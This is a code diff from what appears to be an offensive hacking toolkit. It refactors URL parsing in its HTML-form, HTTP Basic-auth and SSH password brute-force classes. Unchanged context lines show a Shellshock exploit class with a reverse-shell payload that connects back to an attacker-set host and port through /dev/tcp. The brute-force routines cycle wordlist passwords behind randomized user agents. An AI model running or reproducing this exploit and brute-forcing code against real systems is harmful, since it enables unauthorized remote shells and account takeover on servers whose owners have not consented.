@@ -14,6 +14,7 @@ from paramiko import AutoAddPolicy
 
 # My modules
 from ..core import errors
+from ..core import http
 from ..core import tool as core
 from ..core import headers as head
 
@@ -83,7 +84,7 @@ class Bashdoor:
 		self.PAYLOAD = "() { :; }; echo; /bin/bash -i >& /dev/tcp/%s/%s 0>&1" %(self.LHOST, self.LPORT)
 
 		if platform.system() == "Windows":
-			raise errors.WindowsError("This class can't be runned on a windows host.")
+			raise errors.WindowsError("This class can't be runned on a windows host at this time.")
 
 		self.run()
 
@@ -129,19 +130,7 @@ class HTMLBrute:
 
 	def brute(self, i, q):
 
-		https = False
-
-		if "http://" in self.URL:
-			self.URL = self.URL.replace("http://", "")
-		
-		elif "https://" in self.URL:
-			https = True
-			self.URL = self.URL.replace("https://", "")
-
-		if https == True:
-			self.URL = "https://" + self.URL
-		else:
-			self.URL = "http://" + self.URL
+		URL = http.URI(self.URL).prepare()
 		
 		while True:
 			i = q.get()
@@ -149,7 +138,7 @@ class HTMLBrute:
 			try:
 				data = {self.USERFIELD: self.USER, self.PASSFIELD: i}
 				params = urllib.urlencode(data)
-				req = urllib2.Request(self.URL, headers={'User-Agent': core.Tools().randomagent()})
+				req = urllib2.Request(URL, headers={'User-Agent': core.Tools().randomagent()})
 				response = urllib2.urlopen(req, params)
 				
 				data = str(response.read())
@@ -199,24 +188,13 @@ class HTTPBrute:
 		self.run()
 
 	def brute(self, q):
-		i = q.get()
-		https = False
 
-		if "http://" in self.URL:
-			self.URL = self.URL.replace("http://", "")
-		
-		elif "https://" in self.URL:
-			https = True
-			self.URL = self.URL.replace("https://", "")
-
-		if https == True:
-			self.URL = "https://" + self.URL
-		else:
-			self.URL = "http://" + self.URL
+		URL = http.URI(self.URL).prepare()
 
 		while True:
+			i = q.get()
 
-			req = urllib2.Request(self.URL, headers={'User-Agent': core.Tools().randomagent()})
+			req = urllib2.Request(URL, headers={'User-Agent': core.Tools().randomagent()})
 
 			encstr = base64.encodestring('%s:%s' % (self.USERNAME, i)).replace('\n', '')
 			req.add_header("Authorization", "Basic %s" % encstr)
@@ -275,10 +253,9 @@ class SSHBrute:
 		self.WORDLIST = WORDLIST
 
 	def brute(self, q):
-
-		i = q.get()
-
+		HOST = http.URI(self.HOST).host()
 		while True:
+			i = q.get()
 
 			ssh = SSHClient()
 			ssh.set_missing_host_key_policy(AutoAddPolicy())
